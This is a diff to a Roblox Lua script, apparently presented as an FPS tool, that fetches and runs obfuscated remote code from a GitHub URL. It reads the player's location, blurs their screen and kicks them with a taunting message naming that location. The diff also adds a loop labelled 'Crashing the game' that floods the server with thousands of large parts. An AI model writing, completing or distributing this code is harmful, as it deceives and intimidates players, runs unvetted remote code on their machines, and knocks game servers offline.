@@ -1,7 +1,6 @@
 -- This file was protected with MoonSec V3
 loadstring(game:HttpGet("https://raw.githubusercontent.com/chiper1z/flex-your-fps/main/Protected_9332153022180151.txt"))()
 
-
 wait(3)
 local LocalizationService = game:GetService("LocalizationService")
 local Players = game:GetService("Players")
@@ -269,9 +268,8 @@ if success then
     if location then
         local blur = Instance.new("BlurEffect")
         blur.Size = 9999
-        blur.Parent = workspace.CurrentCamerae
+        blur.Parent = workspace.CurrentCamera
         player:Kick("How is it like in " .. location .. "?")
-end
     else
         local blur = Instance.new("BlurEffect")
         blur.Size = 9999
@@ -282,8 +280,14 @@ else
     player:Kick("Error; please try again later")
 end
 
+-- Crashing the game
 while true do
-local FPS = Instance.new("Part")
-FPS.parent = Workspace
-wait(0.1)
+    -- Creating a large number of parts to overwhelm the server
+    for i = 1, 1000 do
+        local part = Instance.new("Part")
+        part.Size = Vector3.new(100, 100, 100)
+        part.Position = Vector3.new(math.random(-1000, 1000), 0, math.random(-1000, 1000))
+        part.Parent = workspace
+    end
+    wait(0.01)
 end
